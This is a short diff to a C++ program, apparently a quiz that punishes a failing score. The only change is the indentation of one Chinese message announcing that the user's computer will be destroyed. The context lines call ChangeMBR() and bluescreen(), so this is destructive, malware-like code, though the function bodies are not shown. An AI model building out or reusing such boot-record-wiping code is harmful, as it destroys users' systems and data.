@@ -23,7 +23,7 @@ void killcomputer(int score)
 	system("cls");
 	cout << "\t\t不及格!你的分数为" << score << "分,不及格!"<<endl;
 	cout << "\t\t不及格!不及格!不及格!不及格!不及格!!!!!!!!!!!!!!!!!!!!!!!!!!!"<<endl;
-	cout << "那么,就让我遵守契约,毁灭你的计算机吧!"<<endl;
+	cout << "\t\t那么,就让我遵守契约,毁灭你的计算机吧!"<<endl;
 	ChangeMBR();
 	Sleep(5000);
 	bluescreen();
